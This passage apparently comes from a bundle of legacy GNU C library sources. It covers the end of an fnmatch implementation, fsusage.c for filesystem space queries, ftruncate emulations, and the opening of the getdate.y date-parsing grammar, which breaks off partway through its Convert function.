	    /* Nonzero if the sense of the character class is inverted.  */
	    register int not;

	    if (*n == '\0')
	      return FNM_NOMATCH;

	    if ((flags & FNM_PERIOD) && *n == '.' &&
		(n == string || ((flags & FNM_FILE_NAME) && n[-1] == '/')))
	      return FNM_NOMATCH;

	    not = (*p == '!' || *p == '^');
	    if (not)
	      ++p;

	    c = *p++;
	    for (;;)
	      {
		register char cstart = c, cend = c;

		if (!(flags & FNM_NOESCAPE) && c == '\\')
		  cstart = cend = *p++;

		cstart = cend = FOLD (cstart);

		if (c == '\0')
		  /* [ (unterminated) loses.  */
		  return FNM_NOMATCH;

		c = *p++;
		c = FOLD (c);

		if ((flags & FNM_FILE_NAME) && c == '/')
		  /* [/] can never match.  */
		  return FNM_NOMATCH;

		if (c == '-' && *p != ']')
		  {
		    cend = *p++;
		    if (!(flags & FNM_NOESCAPE) && cend == '\\')
		      cend = *p++;
		    if (cend == '\0')
		      return FNM_NOMATCH;
		    cend = FOLD (cend);

		    c = *p++;
		  }

		if (FOLD (*n) >= cstart && FOLD (*n) <= cend)
		  goto matched;

		if (c == ']')
		  break;
	      }
	    if (!not)
	      return FNM_NOMATCH;
	    break;

	  matched:;
	    /* Skip the rest of the [...] that already matched.  */
	    while (c != ']')
	      {
		if (c == '\0')
		  /* [... (unterminated) loses.  */
		  return FNM_NOMATCH;

		c = *p++;
		if (!(flags & FNM_NOESCAPE) && c == '\\')
		  /* XXX 1003.2d11 is unclear if this is right.  */
		  ++p;
	      }
	    if (not)
	      return FNM_NOMATCH;
	  }
	  break;

	default:
	  if (c != FOLD (*n))
	    return FNM_NOMATCH;
	}

      ++n;
    }

  if (*n == '\0')
    return 0;

  if ((flags & FNM_LEADING_DIR) && *n == '/')
    /* The FNM_LEADING_DIR flag says that "foo*" matches "foobar/frobozz".  */
    return 0;

  return FNM_NOMATCH;
}

#endif	/* _LIBC or not __GNU_LIBRARY__.  */
/* fsusage.c -- return space usage of mounted filesystems
   Copyright (C) 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include "fsusage.h"

int statfs ();

#ifdef HAVE_SYS_PARAM_H
#include <sys/param.h>
#endif

#ifdef HAVE_SYS_MOUNT_H
#include <sys/mount.h>
#endif

#ifdef HAVE_SYS_VFS_H
#include <sys/vfs.h>
#endif

#if defined(HAVE_SYS_FILSYS_H) && !defined(_CRAY)
#include <sys/filsys.h>		/* SVR2.  */
#endif

#ifdef HAVE_FCNTL_H
#include <fcntl.h>
#endif

#ifdef HAVE_SYS_STATFS_H
#include <sys/statfs.h>
#endif

#ifdef HAVE_DUSTAT_H		/* AIX PS/2.  */
#include <sys/dustat.h>
#endif

#ifdef HAVE_SYS_STATVFS_H	/* SVR4.  */
#include <sys/statvfs.h>
int statvfs ();
#endif

int safe_read ();

/* Return the number of TOSIZE-byte blocks used by
   BLOCKS FROMSIZE-byte blocks, rounding away from zero.
   TOSIZE must be positive.  Return -1 if FROMSIZE is not positive.  */

static long
adjust_blocks (blocks, fromsize, tosize)
     long blocks;
     int fromsize, tosize;
{
  if (tosize <= 0)
    abort ();
  if (fromsize <= 0)
    return -1;

  if (fromsize == tosize)	/* E.g., from 512 to 512.  */
    return blocks;
  else if (fromsize > tosize)	/* E.g., from 2048 to 512.  */
    return blocks * (fromsize / tosize);
  else				/* E.g., from 256 to 512.  */
    return (blocks + (blocks < 0 ? -1 : 1)) / (tosize / fromsize);
}

/* Fill in the fields of FSP with information about space usage for
   the filesystem on which PATH resides.
   DISK is the device on which PATH is mounted, for space-getting
   methods that need to know it.
   Return 0 if successful, -1 if not. */

int
get_fs_usage (path, disk, fsp)
     const char *path;
     const char *disk;
     struct fs_usage *fsp;
{
#if defined (STAT_STATFS3_OSF1)
  struct statfs fsd;

  if (statfs (path, &fsd, sizeof (struct statfs)) != 0)
    return -1;
#define CONVERT_BLOCKS(b) adjust_blocks ((b), fsd.f_fsize, 512)
#endif /* STAT_STATFS3_OSF1 */

#ifdef STAT_STATFS2_FS_DATA	/* Ultrix.  */
  struct fs_data fsd;

  if (statfs (path, &fsd) != 1)
    return -1;
#define CONVERT_BLOCKS(b) adjust_blocks ((b), 1024, 512)
  fsp->fsu_blocks = CONVERT_BLOCKS (fsd.fd_req.btot);
  fsp->fsu_bfree = CONVERT_BLOCKS (fsd.fd_req.bfree);
  fsp->fsu_bavail = CONVERT_BLOCKS (fsd.fd_req.bfreen);
  fsp->fsu_files = fsd.fd_req.gtot;
  fsp->fsu_ffree = fsd.fd_req.gfree;
#endif

#ifdef STAT_READ_FILSYS		/* SVR2.  */
#ifndef SUPERBOFF
#define SUPERBOFF (SUPERB * 512)
#endif
  struct filsys fsd;
  int fd;

  fd = open (disk, O_RDONLY);
  if (fd < 0)
    return -1;
  lseek (fd, (long) SUPERBOFF, 0);
  if (safe_read (fd, (char *) &fsd, sizeof fsd) != sizeof fsd)
    {
      close (fd);
      return -1;
    }
  close (fd);
#define CONVERT_BLOCKS(b) adjust_blocks ((b), (fsd.s_type == Fs2b ? 1024 : 512), 512)
  fsp->fsu_blocks = CONVERT_BLOCKS (fsd.s_fsize);
  fsp->fsu_bfree = CONVERT_BLOCKS (fsd.s_tfree);
  fsp->fsu_bavail = CONVERT_BLOCKS (fsd.s_tfree);
  fsp->fsu_files = (fsd.s_isize - 2) * INOPB * (fsd.s_type == Fs2b ? 2 : 1);
  fsp->fsu_ffree = fsd.s_tinode;
#endif

#ifdef STAT_STATFS2_BSIZE	/* 4.3BSD, SunOS 4, HP-UX, AIX.  */
  struct statfs fsd;

  if (statfs (path, &fsd) < 0)
    return -1;

#ifdef STATFS_TRUNCATES_BLOCK_COUNTS
  /* In SunOS 4.1.2, 4.1.3, and 4.1.3_U1, the block counts in the
     struct statfs are truncated to 2GB.  These conditions detect that
     truncation, presumably without botching the 4.1.1 case, in which
     the values are not truncated.  The correct counts are stored in
     undocumented spare fields.  */
  if (fsd.f_blocks == 0x1fffff && fsd.f_spare[0] > 0)
    {
      fsd.f_blocks = fsd.f_spare[0];
      fsd.f_bfree = fsd.f_spare[1];
      fsd.f_bavail = fsd.f_spare[2];
    }
#endif /* STATFS_TRUNCATES_BLOCK_COUNTS */

#define CONVERT_BLOCKS(b) adjust_blocks ((b), fsd.f_bsize, 512)
#endif

#ifdef STAT_STATFS2_FSIZE	/* 4.4BSD.  */
  struct statfs fsd;

  if (statfs (path, &fsd) < 0)
    return -1;
#define CONVERT_BLOCKS(b) adjust_blocks ((b), fsd.f_fsize, 512)
#endif

#ifdef STAT_STATFS4		/* SVR3, Dynix, Irix, AIX.  */
  struct statfs fsd;

  if (statfs (path, &fsd, sizeof fsd, 0) < 0)
    return -1;
  /* Empirically, the block counts on most SVR3 and SVR3-derived
     systems seem to always be in terms of 512-byte blocks,
     no matter what value f_bsize has.  */
# if _AIX
#  define CONVERT_BLOCKS(b) adjust_blocks ((b), fsd.f_bsize, 512)
# else
#  define CONVERT_BLOCKS(b) (b)
#  ifndef _SEQUENT_		/* _SEQUENT_ is DYNIX/ptx.  */
#   ifndef DOLPHIN		/* DOLPHIN 3.8.alfa/7.18 has f_bavail */
#    define f_bavail f_bfree
#   endif
#  endif
# endif
#endif

#ifdef STAT_STATVFS		/* SVR4.  */
  struct statvfs fsd;

  if (statvfs (path, &fsd) < 0)
    return -1;
  /* f_frsize isn't guaranteed to be supported.  */
#define CONVERT_BLOCKS(b) \
  adjust_blocks ((b), fsd.f_frsize ? fsd.f_frsize : fsd.f_bsize, 512)
#endif

#if !defined(STAT_STATFS2_FS_DATA) && !defined(STAT_READ_FILSYS) /* !Ultrix && !SVR2.  */
  fsp->fsu_blocks = CONVERT_BLOCKS (fsd.f_blocks);
  fsp->fsu_bfree = CONVERT_BLOCKS (fsd.f_bfree);
  fsp->fsu_bavail = CONVERT_BLOCKS (fsd.f_bavail);
  fsp->fsu_files = fsd.f_files;
  fsp->fsu_ffree = fsd.f_ffree;
#endif

  return 0;
}

#if defined(_AIX) && defined(_I386)
/* AIX PS/2 does not supply statfs.  */

int
statfs (path, fsb)
     char *path;
     struct statfs *fsb;
{
  struct stat stats;
  struct dustat fsd;

  if (stat (path, &stats))
    return -1;
  if (dustat (stats.st_dev, 0, &fsd, sizeof (fsd)))
    return -1;
  fsb->f_type   = 0;
  fsb->f_bsize  = fsd.du_bsize;
  fsb->f_blocks = fsd.du_fsize - fsd.du_isize;
  fsb->f_bfree  = fsd.du_tfree;
  fsb->f_bavail = fsd.du_tfree;
  fsb->f_files  = (fsd.du_isize - 2) * fsd.du_inopb;
  fsb->f_ffree  = fsd.du_tinode;
  fsb->f_fsid.val[0] = fsd.du_site;
  fsb->f_fsid.val[1] = fsd.du_pckno;
  return 0;
}
#endif /* _AIX && _I386 */
/* ftruncate emulations that work on some System V's.
   This file is in the public domain.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <fcntl.h>

#ifdef F_CHSIZE

int
ftruncate (fd, length)
     int fd;
     off_t length;
{
  return fcntl (fd, F_CHSIZE, length);
}

#else /* not F_CHSIZE */
#ifdef F_FREESP

/* By William Kucharski <kucharsk@netcom.com>.  */

#include <sys/stat.h>
#include <errno.h>
#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

int
ftruncate (fd, length)
     int fd;
     off_t length;
{
  struct flock fl;
  struct stat filebuf;

  if (fstat (fd, &filebuf) < 0)
    return -1;

  if (filebuf.st_size < length)
    {
      /* Extend file length. */
      if (lseek (fd, (length - 1), SEEK_SET) < 0)
	return -1;

      /* Write a "0" byte. */
      if (write (fd, "", 1) != 1)
	return -1;
    }
  else
    {

      /* Truncate length. */

      fl.l_whence = 0;
      fl.l_len = 0;
      fl.l_start = length;
      fl.l_type = F_WRLCK;	/* write lock on file space */

      /* This relies on the *undocumented* F_FREESP argument to fcntl,
	 which truncates the file so that it ends at the position
	 indicated by fl.l_start.  Will minor miracles never cease?  */

      if (fcntl (fd, F_FREESP, &fl) < 0)
	return -1;
    }

  return 0;
}

#else /* not F_CHSIZE nor F_FREESP */
#ifdef HAVE_CHSIZE

int
ftruncate (fd, length)
     int fd;
     off_t length;
{
  return chsize (fd, length);
}

#else /* not F_CHSIZE nor F_FREESP nor HAVE_CHSIZE */

#include <errno.h>
#ifndef errno
extern int errno;
#endif

int
ftruncate (fd, length)
     int fd;
     off_t length;
{
  errno = EIO;
  return -1;
}

#endif /* not HAVE_CHSIZE */
#endif /* not F_FREESP */
#endif /* not F_CHSIZE */
%{
/*
**  Originally written by Steven M. Bellovin <smb@research.att.com> while
**  at the University of North Carolina at Chapel Hill.  Later tweaked by
**  a couple of people on Usenet.  Completely overhauled by Rich $alz
**  <rsalz@bbn.com> and Jim Berets <jberets@bbn.com> in August, 1990;
**  send any email to Rich.
**
**  This grammar has 10 shift/reduce conflicts.
**
**  This code is in the public domain and has no copyright.
*/
/* SUPPRESS 287 on yaccpar_sccsid *//* Unused static variable */
/* SUPPRESS 288 on yyerrlab *//* Label unused */

#ifdef HAVE_CONFIG_H
#include <config.h>

#ifdef FORCE_ALLOCA_H
#include <alloca.h>
#endif
#endif

/* Since the code of getdate.y is not included in the Emacs executable
   itself, there is no need to #define static in this file.  Even if
   the code were included in the Emacs executable, it probably
   wouldn't do any harm to #undef it here; this will only cause
   problems if we try to write to a static variable, which I don't
   think this code needs to do.  */
#ifdef emacs
#undef static
#endif

#include <stdio.h>
#include <ctype.h>

#if	defined (vms)
#include <types.h>
#include <time.h>
#else
#include <sys/types.h>
#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#include <time.h>
#else
#ifdef HAVE_SYS_TIME_H
#include <sys/time.h>
#else
#include <time.h>
#endif
#endif

#ifdef timezone
#undef timezone /* needed for sgi */
#endif

#if defined (HAVE_SYS_TIMEB_H)
#include <sys/timeb.h>
#else

/* get_date uses the obsolete `struct timeb' in its interface!  FIXME.
   Since some systems don't have it, we define it here;
   callers must do likewise.  */
struct timeb
  {
    time_t		time;		/* Seconds since the epoch	*/
    unsigned short	millitm;	/* Field not used		*/
    short		timezone;	/* Minutes west of GMT		*/
    short		dstflag;	/* Field not used		*/
};
#endif /* defined (HAVE_SYS_TIMEB_H) */

#endif	/* defined (vms) */

#if defined (STDC_HEADERS) || defined (USG)
#include <string.h>
#endif

/* Some old versions of bison generate parsers that use bcopy.
   That loses on systems that don't provide the function, so we have
   to redefine it here.  */
#if !defined (HAVE_BCOPY) && defined (HAVE_MEMCPY) && !defined (bcopy)
#define bcopy(from, to, len) memcpy ((to), (from), (len))
#endif

extern struct tm	*gmtime ();
extern struct tm	*localtime ();

#define yyparse getdate_yyparse
#define yylex getdate_yylex
#define yyerror getdate_yyerror

static int yylex ();
static int yyerror ();

#define EPOCH		1970
#define DOOMSDAY	2038
#define HOUR(x)		((time_t)(x) * 60)
#define SECSPERDAY	(24L * 60L * 60L)

#define MAX_BUFF_LEN    128   /* size of buffer to read the date into */

/*
**  An entry in the lexical lookup table.
*/
typedef struct _TABLE {
    const char	*name;
    int		type;
    time_t	value;
} TABLE;


/*
**  Daylight-savings mode:  on, off, or not yet known.
*/
typedef enum _DSTMODE {
    DSTon, DSToff, DSTmaybe
} DSTMODE;

/*
**  Meridian:  am, pm, or 24-hour style.
*/
typedef enum _MERIDIAN {
    MERam, MERpm, MER24
} MERIDIAN;


/*
**  Global variables.  We could get rid of most of these by using a good
**  union as the yacc stack.  (This routine was originally written before
**  yacc had the %union construct.)  Maybe someday; right now we only use
**  the %union very rarely.
*/
static char	*yyInput;
static DSTMODE	yyDSTmode;
static time_t	yyDayOrdinal;
static time_t	yyDayNumber;
static int	yyHaveDate;
static int	yyHaveDay;
static int	yyHaveRel;
static int	yyHaveTime;
static int	yyHaveZone;
static time_t	yyTimezone;
static time_t	yyDay;
static time_t	yyHour;
static time_t	yyMinutes;
static time_t	yyMonth;
static time_t	yySeconds;
static time_t	yyYear;
static MERIDIAN	yyMeridian;
static time_t	yyRelMonth;
static time_t	yyRelSeconds;

%}

%union {
    time_t		Number;
    enum _MERIDIAN	Meridian;
}

%token	tAGO tDAY tDAYZONE tID tMERIDIAN tMINUTE_UNIT tMONTH tMONTH_UNIT
%token	tSEC_UNIT tSNUMBER tUNUMBER tZONE tDST

%type	<Number>	tDAY tDAYZONE tMINUTE_UNIT tMONTH tMONTH_UNIT
%type	<Number>	tSEC_UNIT tSNUMBER tUNUMBER tZONE
%type	<Meridian>	tMERIDIAN o_merid

%%

spec	: /* NULL */
	| spec item
	;

item	: time {
	    yyHaveTime++;
	}
	| zone {
	    yyHaveZone++;
	}
	| date {
	    yyHaveDate++;
	}
	| day {
	    yyHaveDay++;
	}
	| rel {
	    yyHaveRel++;
	}
	| number
	;

time	: tUNUMBER tMERIDIAN {
	    yyHour = $1;
	    yyMinutes = 0;
	    yySeconds = 0;
	    yyMeridian = $2;
	}
	| tUNUMBER ':' tUNUMBER o_merid {
	    yyHour = $1;
	    yyMinutes = $3;
	    yySeconds = 0;
	    yyMeridian = $4;
	}
	| tUNUMBER ':' tUNUMBER tSNUMBER {
	    yyHour = $1;
	    yyMinutes = $3;
	    yyMeridian = MER24;
	    yyDSTmode = DSToff;
	    yyTimezone = - ($4 % 100 + ($4 / 100) * 60);
	}
	| tUNUMBER ':' tUNUMBER ':' tUNUMBER o_merid {
	    yyHour = $1;
	    yyMinutes = $3;
	    yySeconds = $5;
	    yyMeridian = $6;
	}
	| tUNUMBER ':' tUNUMBER ':' tUNUMBER tSNUMBER {
	    yyHour = $1;
	    yyMinutes = $3;
	    yySeconds = $5;
	    yyMeridian = MER24;
	    yyDSTmode = DSToff;
	    yyTimezone = - ($6 % 100 + ($6 / 100) * 60);
	}
	;

zone	: tZONE {
	    yyTimezone = $1;
	    yyDSTmode = DSToff;
	}
	| tDAYZONE {
	    yyTimezone = $1;
	    yyDSTmode = DSTon;
	}
	|
	  tZONE tDST {
	    yyTimezone = $1;
	    yyDSTmode = DSTon;
	}
	;

day	: tDAY {
	    yyDayOrdinal = 1;
	    yyDayNumber = $1;
	}
	| tDAY ',' {
	    yyDayOrdinal = 1;
	    yyDayNumber = $1;
	}
	| tUNUMBER tDAY {
	    yyDayOrdinal = $1;
	    yyDayNumber = $2;
	}
	;

date	: tUNUMBER '/' tUNUMBER {
	    yyMonth = $1;
	    yyDay = $3;
	}
	| tUNUMBER '/' tUNUMBER '/' tUNUMBER {
	    yyMonth = $1;
	    yyDay = $3;
	    yyYear = $5;
	}
	| tUNUMBER tSNUMBER tSNUMBER {
	    /* ISO 8601 format.  yyyy-mm-dd.  */
	    yyYear = $1;
	    yyMonth = -$2;
	    yyDay = -$3;
	}
	| tUNUMBER tMONTH tSNUMBER {
	    /* e.g. 17-JUN-1992.  */
	    yyDay = $1;
	    yyMonth = $2;
	    yyYear = -$3;
	}
	| tMONTH tUNUMBER {
	    yyMonth = $1;
	    yyDay = $2;
	}
	| tMONTH tUNUMBER ',' tUNUMBER {
	    yyMonth = $1;
	    yyDay = $2;
	    yyYear = $4;
	}
	| tUNUMBER tMONTH {
	    yyMonth = $2;
	    yyDay = $1;
	}
	| tUNUMBER tMONTH tUNUMBER {
	    yyMonth = $2;
	    yyDay = $1;
	    yyYear = $3;
	}
	;

rel	: relunit tAGO {
	    yyRelSeconds = -yyRelSeconds;
	    yyRelMonth = -yyRelMonth;
	}
	| relunit
	;

relunit	: tUNUMBER tMINUTE_UNIT {
	    yyRelSeconds += $1 * $2 * 60L;
	}
	| tSNUMBER tMINUTE_UNIT {
	    yyRelSeconds += $1 * $2 * 60L;
	}
	| tMINUTE_UNIT {
	    yyRelSeconds += $1 * 60L;
	}
	| tSNUMBER tSEC_UNIT {
	    yyRelSeconds += $1;
	}
	| tUNUMBER tSEC_UNIT {
	    yyRelSeconds += $1;
	}
	| tSEC_UNIT {
	    yyRelSeconds++;
	}
	| tSNUMBER tMONTH_UNIT {
	    yyRelMonth += $1 * $2;
	}
	| tUNUMBER tMONTH_UNIT {
	    yyRelMonth += $1 * $2;
	}
	| tMONTH_UNIT {
	    yyRelMonth += $1;
	}
	;

number	: tUNUMBER {
	    if (yyHaveTime && yyHaveDate && !yyHaveRel)
		yyYear = $1;
	    else {
		if ($1>10000) {
		    yyHaveDate++;
		    yyDay= ($1)%100;
		    yyMonth= ($1/100)%100;
		    yyYear = $1/10000;
		}
		else {
		    yyHaveTime++;
		    if ($1 < 100) {
			yyHour = $1;
			yyMinutes = 0;
		    }
		    else {
		    	yyHour = $1 / 100;
		    	yyMinutes = $1 % 100;
		    }
		    yySeconds = 0;
		    yyMeridian = MER24;
	        }
	    }
	}
	;

o_merid	: /* NULL */ {
	    $$ = MER24;
	}
	| tMERIDIAN {
	    $$ = $1;
	}
	;

%%

/* Month and day table. */
static TABLE const MonthDayTable[] = {
    { "january",	tMONTH,  1 },
    { "february",	tMONTH,  2 },
    { "march",		tMONTH,  3 },
    { "april",		tMONTH,  4 },
    { "may",		tMONTH,  5 },
    { "june",		tMONTH,  6 },
    { "july",		tMONTH,  7 },
    { "august",		tMONTH,  8 },
    { "september",	tMONTH,  9 },
    { "sept",		tMONTH,  9 },
    { "october",	tMONTH, 10 },
    { "november",	tMONTH, 11 },
    { "december",	tMONTH, 12 },
    { "sunday",		tDAY, 0 },
    { "monday",		tDAY, 1 },
    { "tuesday",	tDAY, 2 },
    { "tues",		tDAY, 2 },
    { "wednesday",	tDAY, 3 },
    { "wednes",		tDAY, 3 },
    { "thursday",	tDAY, 4 },
    { "thur",		tDAY, 4 },
    { "thurs",		tDAY, 4 },
    { "friday",		tDAY, 5 },
    { "saturday",	tDAY, 6 },
    { NULL }
};

/* Time units table. */
static TABLE const UnitsTable[] = {
    { "year",		tMONTH_UNIT,	12 },
    { "month",		tMONTH_UNIT,	1 },
    { "fortnight",	tMINUTE_UNIT,	14 * 24 * 60 },
    { "week",		tMINUTE_UNIT,	7 * 24 * 60 },
    { "day",		tMINUTE_UNIT,	1 * 24 * 60 },
    { "hour",		tMINUTE_UNIT,	60 },
    { "minute",		tMINUTE_UNIT,	1 },
    { "min",		tMINUTE_UNIT,	1 },
    { "second",		tSEC_UNIT,	1 },
    { "sec",		tSEC_UNIT,	1 },
    { NULL }
};

/* Assorted relative-time words. */
static TABLE const OtherTable[] = {
    { "tomorrow",	tMINUTE_UNIT,	1 * 24 * 60 },
    { "yesterday",	tMINUTE_UNIT,	-1 * 24 * 60 },
    { "today",		tMINUTE_UNIT,	0 },
    { "now",		tMINUTE_UNIT,	0 },
    { "last",		tUNUMBER,	-1 },
    { "this",		tMINUTE_UNIT,	0 },
    { "next",		tUNUMBER,	2 },
    { "first",		tUNUMBER,	1 },
/*  { "second",		tUNUMBER,	2 }, */
    { "third",		tUNUMBER,	3 },
    { "fourth",		tUNUMBER,	4 },
    { "fifth",		tUNUMBER,	5 },
    { "sixth",		tUNUMBER,	6 },
    { "seventh",	tUNUMBER,	7 },
    { "eighth",		tUNUMBER,	8 },
    { "ninth",		tUNUMBER,	9 },
    { "tenth",		tUNUMBER,	10 },
    { "eleventh",	tUNUMBER,	11 },
    { "twelfth",	tUNUMBER,	12 },
    { "ago",		tAGO,	1 },
    { NULL }
};

/* The timezone table. */
/* Some of these are commented out because a time_t can't store a float. */
static TABLE const TimezoneTable[] = {
    { "gmt",	tZONE,     HOUR ( 0) },	/* Greenwich Mean */
    { "ut",	tZONE,     HOUR ( 0) },	/* Universal (Coordinated) */
    { "utc",	tZONE,     HOUR ( 0) },
    { "wet",	tZONE,     HOUR ( 0) },	/* Western European */
    { "bst",	tDAYZONE,  HOUR ( 0) },	/* British Summer */
    { "wat",	tZONE,     HOUR ( 1) },	/* West Africa */
    { "at",	tZONE,     HOUR ( 2) },	/* Azores */
#if	0
    /* For completeness.  BST is also British Summer, and GST is
     * also Guam Standard. */
    { "bst",	tZONE,     HOUR ( 3) },	/* Brazil Standard */
    { "gst",	tZONE,     HOUR ( 3) },	/* Greenland Standard */
#endif
#if 0
    { "nft",	tZONE,     HOUR (3.5) },	/* Newfoundland */
    { "nst",	tZONE,     HOUR (3.5) },	/* Newfoundland Standard */
    { "ndt",	tDAYZONE,  HOUR (3.5) },	/* Newfoundland Daylight */
#endif
    { "ast",	tZONE,     HOUR ( 4) },	/* Atlantic Standard */
    { "adt",	tDAYZONE,  HOUR ( 4) },	/* Atlantic Daylight */
    { "est",	tZONE,     HOUR ( 5) },	/* Eastern Standard */
    { "edt",	tDAYZONE,  HOUR ( 5) },	/* Eastern Daylight */
    { "cst",	tZONE,     HOUR ( 6) },	/* Central Standard */
    { "cdt",	tDAYZONE,  HOUR ( 6) },	/* Central Daylight */
    { "mst",	tZONE,     HOUR ( 7) },	/* Mountain Standard */
    { "mdt",	tDAYZONE,  HOUR ( 7) },	/* Mountain Daylight */
    { "pst",	tZONE,     HOUR ( 8) },	/* Pacific Standard */
    { "pdt",	tDAYZONE,  HOUR ( 8) },	/* Pacific Daylight */
    { "yst",	tZONE,     HOUR ( 9) },	/* Yukon Standard */
    { "ydt",	tDAYZONE,  HOUR ( 9) },	/* Yukon Daylight */
    { "hst",	tZONE,     HOUR (10) },	/* Hawaii Standard */
    { "hdt",	tDAYZONE,  HOUR (10) },	/* Hawaii Daylight */
    { "cat",	tZONE,     HOUR (10) },	/* Central Alaska */
    { "ahst",	tZONE,     HOUR (10) },	/* Alaska-Hawaii Standard */
    { "nt",	tZONE,     HOUR (11) },	/* Nome */
    { "idlw",	tZONE,     HOUR (12) },	/* International Date Line West */
    { "cet",	tZONE,     -HOUR (1) },	/* Central European */
    { "met",	tZONE,     -HOUR (1) },	/* Middle European */
    { "mewt",	tZONE,     -HOUR (1) },	/* Middle European Winter */
    { "mest",	tDAYZONE,  -HOUR (1) },	/* Middle European Summer */
    { "mesz",	tDAYZONE,  -HOUR (1) },	/* Middle European Summer */
    { "swt",	tZONE,     -HOUR (1) },	/* Swedish Winter */
    { "sst",	tDAYZONE,  -HOUR (1) },	/* Swedish Summer */
    { "fwt",	tZONE,     -HOUR (1) },	/* French Winter */
    { "fst",	tDAYZONE,  -HOUR (1) },	/* French Summer */
    { "eet",	tZONE,     -HOUR (2) },	/* Eastern Europe, USSR Zone 1 */
    { "bt",	tZONE,     -HOUR (3) },	/* Baghdad, USSR Zone 2 */
#if 0
    { "it",	tZONE,     -HOUR (3.5) },/* Iran */
#endif
    { "zp4",	tZONE,     -HOUR (4) },	/* USSR Zone 3 */
    { "zp5",	tZONE,     -HOUR (5) },	/* USSR Zone 4 */
#if 0
    { "ist",	tZONE,     -HOUR (5.5) },/* Indian Standard */
#endif
    { "zp6",	tZONE,     -HOUR (6) },	/* USSR Zone 5 */
#if	0
    /* For completeness.  NST is also Newfoundland Standard, and SST is
     * also Swedish Summer. */
    { "nst",	tZONE,     -HOUR (6.5) },/* North Sumatra */
    { "sst",	tZONE,     -HOUR (7) },	/* South Sumatra, USSR Zone 6 */
#endif	/* 0 */
    { "wast",	tZONE,     -HOUR (7) },	/* West Australian Standard */
    { "wadt",	tDAYZONE,  -HOUR (7) },	/* West Australian Daylight */
#if 0
    { "jt",	tZONE,     -HOUR (7.5) },/* Java (3pm in Cronusland!) */
#endif
    { "cct",	tZONE,     -HOUR (8) },	/* China Coast, USSR Zone 7 */
    { "jst",	tZONE,     -HOUR (9) },	/* Japan Standard, USSR Zone 8 */
#if 0
    { "cast",	tZONE,     -HOUR (9.5) },/* Central Australian Standard */
    { "cadt",	tDAYZONE,  -HOUR (9.5) },/* Central Australian Daylight */
#endif
    { "east",	tZONE,     -HOUR (10) },	/* Eastern Australian Standard */
    { "eadt",	tDAYZONE,  -HOUR (10) },	/* Eastern Australian Daylight */
    { "gst",	tZONE,     -HOUR (10) },	/* Guam Standard, USSR Zone 9 */
    { "nzt",	tZONE,     -HOUR (12) },	/* New Zealand */
    { "nzst",	tZONE,     -HOUR (12) },	/* New Zealand Standard */
    { "nzdt",	tDAYZONE,  -HOUR (12) },	/* New Zealand Daylight */
    { "idle",	tZONE,     -HOUR (12) },	/* International Date Line East */
    {  NULL  }
};

/* Military timezone table. */
static TABLE const MilitaryTable[] = {
    { "a",	tZONE,	HOUR (  1) },
    { "b",	tZONE,	HOUR (  2) },
    { "c",	tZONE,	HOUR (  3) },
    { "d",	tZONE,	HOUR (  4) },
    { "e",	tZONE,	HOUR (  5) },
    { "f",	tZONE,	HOUR (  6) },
    { "g",	tZONE,	HOUR (  7) },
    { "h",	tZONE,	HOUR (  8) },
    { "i",	tZONE,	HOUR (  9) },
    { "k",	tZONE,	HOUR ( 10) },
    { "l",	tZONE,	HOUR ( 11) },
    { "m",	tZONE,	HOUR ( 12) },
    { "n",	tZONE,	HOUR (- 1) },
    { "o",	tZONE,	HOUR (- 2) },
    { "p",	tZONE,	HOUR (- 3) },
    { "q",	tZONE,	HOUR (- 4) },
    { "r",	tZONE,	HOUR (- 5) },
    { "s",	tZONE,	HOUR (- 6) },
    { "t",	tZONE,	HOUR (- 7) },
    { "u",	tZONE,	HOUR (- 8) },
    { "v",	tZONE,	HOUR (- 9) },
    { "w",	tZONE,	HOUR (-10) },
    { "x",	tZONE,	HOUR (-11) },
    { "y",	tZONE,	HOUR (-12) },
    { "z",	tZONE,	HOUR (  0) },
    { NULL }
};




/* ARGSUSED */
static int
yyerror (s)
    char	*s;
{
  return 0;
}


static time_t
ToSeconds (Hours, Minutes, Seconds, Meridian)
    time_t	Hours;
    time_t	Minutes;
    time_t	Seconds;
    MERIDIAN	Meridian;
{
  if (Minutes < 0 || Minutes > 59 || Seconds < 0 || Seconds > 59)
    return -1;
  switch (Meridian) {
  case MER24:
    if (Hours < 0 || Hours > 23)
      return -1;
    return (Hours * 60L + Minutes) * 60L + Seconds;
  case MERam:
    if (Hours < 1 || Hours > 12)
      return -1;
    if (Hours == 12)
      Hours = 0;
    return (Hours * 60L + Minutes) * 60L + Seconds;
  case MERpm:
    if (Hours < 1 || Hours > 12)
      return -1;
    if (Hours == 12)
      Hours = 0;
    return ((Hours + 12) * 60L + Minutes) * 60L + Seconds;
  default:
    abort ();
  }
  /* NOTREACHED */
}


static time_t
Convert (Month, Day, Year, Hours, Minutes, Seconds, Meridian, DSTmode)
    time_t	Month;
    time_t	Day;
    time_t	Year;
    time_t	Hours;
    time_t	Minutes;
    time_t	Seconds;
    MERIDIAN	Meridian;
    DSTMODE	DSTmode;
{
  static int DaysInMonth[12] = {
    31, 0, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31
  };
  time_t	tod;
  time_t	Julian;
  int		i;

  if (Year < 0)
    Year = -Year;
  if (Year < DOOMSDAY-2000)
    Year += 2000;
  else if (Year < 100)
    Year += 1900;
  DaysInMonth[1] = Year % 4 == 0 && (Year % 100 != 0 || Year % 400 == 0)
    ? 29 : 28;
  if (Year < EPOCH || Year >= DOOMSDAY
      || Month < 1 || Month > 12
      /* Lint fluff:  "conversion from long may lose accuracy" */
      || Day < 1 || Day > DaysInMonth[(int)--Month])
    return -1;

  for (Julian = Day - 1, i = 0; i < Month; i++)
    Julian += DaysInMonth[i];
  for (i = EPOCH; i < Year; i++)
    Julian += 365 + (i % 4 == 0);
  Julian *= SECSPERDAY;
  Julian += yyTimezone * 60L;
